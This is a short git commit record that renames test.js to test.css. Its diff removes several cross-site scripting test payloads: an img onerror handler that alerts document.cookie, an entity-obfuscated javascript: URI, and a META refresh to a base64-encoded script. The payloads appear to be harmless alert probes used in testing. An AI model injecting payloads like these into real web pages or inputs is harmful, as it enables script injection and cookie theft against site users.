c8c0df1cbb24edf1a93fbf2699e3adb1f4517278
Kesha <djychum@mail.ru>
2016-08-20 05:15:25 +0700

    Update and rename test.js to test.css

--- test.js
+++
@@ -1,5 +0,0 @@
-alert(1)
-<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>
-<IMG SRC=j&#X41vascript:alert('test2')>
-<META HTTP-EQUIV="refresh"
-CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">
